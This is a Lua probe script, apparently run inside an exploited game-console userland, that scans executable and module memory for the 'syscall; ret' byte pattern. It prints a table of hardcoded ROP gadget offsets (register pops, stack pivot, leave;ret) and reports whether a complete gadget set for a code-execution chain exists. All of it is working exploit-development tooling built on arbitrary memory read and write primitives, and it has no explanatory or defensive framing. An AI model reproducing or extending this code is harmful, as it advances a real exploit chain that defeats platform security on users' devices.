-- CRASH_CLASS: SAFE (read-only)
-- PROBE 41u: find syscall;ret — the LAST missing gadget
-- 1) Scan eboot tail 0x448000-0x494000
-- 2) Scan ALL module data segments for 0F 05 C3
-- 3) Check eboot PLT/GOT region for syscall stubs

print("=== PROBE 41u: FIND SYSCALL;RET ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end

local sc_dynlib_get_list = make_syscall(592)
local sc_dynlib_get_info = make_syscall(593)

-- Get eboot info
local info_buf = memory.alloc(0x200)
for off = 0, 0x1F8, 4 do safe_wd(info_buf + off, 0) end
safe_wd(info_buf, 0x160)
pcall(function() sc_dynlib_get_info(uint64(0), info_buf) end)
local tb_lo = safe_rd(info_buf + 0x108)
local tb_hi = safe_rd(info_buf + 0x10C)
if not tb_lo or not tb_hi then print("FAILED"); return end
local text_hex = string.format("0x%X%08X", tb_hi, tb_lo)
local eboot = uint64(text_hex)
print("eboot: " .. text_hex)

--------------------------------------------------------------------
-- PART 1: Scan eboot tail 0x448000-0x494000
--------------------------------------------------------------------
print("")
print("--- PART 1: EBOOT TAIL 0x448000-0x494000 ---")
local found = {}
for off = 0x448000, 0x494000 - 4, 4 do
    local dw = safe_rd(eboot + off)
    if dw == nil then
        print("fault at +0x" .. string.format("%X", off))
        break
    end
    local b0 = dw % 256
    local b1 = math.floor(dw / 256) % 256
    local b2 = math.floor(dw / 65536) % 256
    local b3 = math.floor(dw / 16777216) % 256
    if b0 == 0x0F and b1 == 0x05 and b2 == 0xC3 and #found < 8 then
        found[#found + 1] = off
    end
    if b1 == 0x0F and b2 == 0x05 and b3 == 0xC3 and #found < 8 then
        found[#found + 1] = off + 1
    end
end
print("syscall;ret in tail: " .. #found)
for _, off in ipairs(found) do
    local b0 = safe_rb(eboot + off)
    local b1 = safe_rb(eboot + off + 1)
    local b2 = safe_rb(eboot + off + 2)
    print(string.format("  eboot+0x%06X: %02X %02X %02X %s", off,
        b0 or 0, b1 or 0, b2 or 0,
        (b0 == 0x0F and b1 == 0x05 and b2 == 0xC3) and "CONFIRMED" or "mismatch"))
end

--------------------------------------------------------------------
-- PART 2: Scan ALL module data segments
--------------------------------------------------------------------
print("")
print("--- PART 2: MODULE DATA SEGMENTS ---")
local handle_buf = memory.alloc(512)
local num_buf = memory.alloc(8)
pcall(function() sc_dynlib_get_list(handle_buf, uint64(128), num_buf) end)
local num_h = safe_rd(num_buf) or 0

local all_found = {}
for i = 0, math.min(num_h - 1, 38) do
    local h = safe_rd(handle_buf + i * 4)
    if h then
        for off2 = 0, 0x1F8, 4 do safe_wd(info_buf + off2, 0) end
        safe_wd(info_buf, 0x160)
        pcall(function() sc_dynlib_get_info(uint64(h), info_buf) end)
        local name_bytes = {}
        for nb = 0, 31 do
            local c = safe_rb(info_buf + 0x08 + nb)
            if c and c > 0 and c < 128 then name_bytes[#name_bytes + 1] = string.char(c)
            else break end
        end
        local name = table.concat(name_bytes)
        -- data segment is at +0x118/+0x11C base, +0x120 size
        local dl = safe_rd(info_buf + 0x118)
        local dh = safe_rd(info_buf + 0x11C)
        local ds = safe_rd(info_buf + 0x120)
        if dl and dh and ds and ds > 0 then
            local d_hex = string.format("0x%X%08X", dh, dl)
            local daddr = uint64(d_hex)
            local test = safe_rd(daddr)
            if test then
                local sr = 0
                local sr_offs = {}
                local scan_max = math.min(ds, 0x20000)
                for off = 0, scan_max - 4, 4 do
                    local dw = safe_rd(daddr + off)
                    if dw == nil then break end
                    local b0 = dw % 256
                    local b1 = math.floor(dw / 256) % 256
                    local b2 = math.floor(dw / 65536) % 256
                    local b3 = math.floor(dw / 16777216) % 256
                    if b0 == 0x0F and b1 == 0x05 and b2 == 0xC3 then
                        sr = sr + 1
                        if #sr_offs < 4 then sr_offs[#sr_offs + 1] = off end
                    end
                    if b1 == 0x0F and b2 == 0x05 and b3 == 0xC3 then
                        sr = sr + 1
                        if #sr_offs < 4 then sr_offs[#sr_offs + 1] = off + 1 end
                    end
                end
                if sr > 0 then
                    print(string.format("  %-24s data %s: %d syscall;ret!", name, d_hex, sr))
                    for _, soff in ipairs(sr_offs) do
                        local b0 = safe_rb(daddr + soff)
                        local b1 = safe_rb(daddr + soff + 1)
                        local b2 = safe_rb(daddr + soff + 2)
                        print(string.format("    +0x%X: %02X %02X %02X %s",
                            soff, b0 or 0, b1 or 0, b2 or 0,
                            (b0 == 0x0F and b1 == 0x05 and b2 == 0xC3) and "CONFIRMED" or "mismatch"))
                        if b0 == 0x0F and b1 == 0x05 and b2 == 0xC3 then
                            all_found[#all_found + 1] = {name = name, base = d_hex, off = soff}
                        end
                    end
                end
            end
        end
    end
end

if #all_found == 0 then
    print("  no syscall;ret in any data segment")
end

--------------------------------------------------------------------
-- PART 3: Alternative — scan for int 0x80; ret (CD 80 C3)
-- or syscall alone (0F 05) without ret
--------------------------------------------------------------------
print("")
print("--- PART 3: ALTERNATIVES ---")
-- scan eboot for bare syscall (0F 05) — maybe followed by nop;ret or pop;ret
local bare = {}
for off = 0x0, 0x48000 - 4, 4 do
    local dw = safe_rd(eboot + off)
    if dw == nil then break end
    local b0 = dw % 256
    local b1 = math.floor(dw / 256) % 256
    local b2 = math.floor(dw / 65536) % 256
    local b3 = math.floor(dw / 16777216) % 256
    if b0 == 0x0F and b1 == 0x05 and #bare < 8 then
        bare[#bare + 1] = {off = off, next1 = b2, next2 = b3}
    end
    if b1 == 0x0F and b2 == 0x05 and #bare < 8 then
        bare[#bare + 1] = {off = off + 1, next1 = b3, next2 = nil}
    end
end
print("bare syscall (0F 05) in eboot first 300KB: " .. #bare)
for _, b in ipairs(bare) do
    -- read the byte after to see context
    local after = safe_rb(eboot + b.off + 2) or 0
    local after2 = safe_rb(eboot + b.off + 3) or 0
    print(string.format("  eboot+0x%06X: 0F 05 %02X %02X", b.off, after, after2))
end

print("")
print("=== FINAL ROP CHAIN STATUS ===")
local sr_source = "MISSING"
if #found > 0 then
    sr_source = string.format("eboot+0x%X (tail)", found[1])
end
if sr_source == "MISSING" and #all_found > 0 then
    local f = all_found[1]
    sr_source = string.format("%s data+0x%X", f.name, f.off)
end

local chain = {
    {"pop rdi;ret", "eboot+0xC9DFE"},
    {"pop rsi;ret", "eboot+0xD77D"},
    {"pop rdx;ret", "eboot+0x420E6D"},
    {"pop rax;ret", "eboot+0x992"},
    {"syscall;ret", sr_source},
    {"jmp rax", "eboot+0x84C"},
    {"xchg rsp", "eboot+0x163874"},
    {"leave;ret", "eboot+0x37FDE0"},
}
local complete = true
for _, c in ipairs(chain) do
    print(string.format("  %-14s %s", c[1], c[2]))
    if c[2] == "MISSING" then complete = false end
end
print("")
if complete then
    print("*** COMPLETE ROP GADGET SET ***")
else
    print("syscall;ret not in eboot — need libkernel text or alternative trigger")
end

print("")
print("=== PROBE 41u COMPLETE ===")
